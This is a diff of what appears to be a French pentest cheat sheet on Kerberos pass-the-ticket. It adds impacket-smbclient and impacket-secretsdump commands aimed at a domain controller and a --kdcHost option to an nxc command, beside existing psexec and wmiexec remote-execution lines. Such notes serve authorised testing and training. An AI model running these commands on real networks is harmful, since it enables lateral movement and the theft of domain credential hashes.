@@ -147,9 +147,11 @@ export KRB5CCNAME=/tmp/<user>.ccache
 # impacket (-target-ip si le hostname ne résout pas sur Kali)
 impacket-psexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
 impacket-wmiexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
+impacket-smbclient -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
+impacket-secretsdump -k -no-pass corp.com/<user>@<HOSTNAME_DC> -dc-ip <IP_DC> -target-ip <IP_DC>
 
 # nxc
-nxc smb <IP_CIBLE> -u <user> -k --use-kcache
+nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
 ```
 
 **Windows (Mimikatz)**
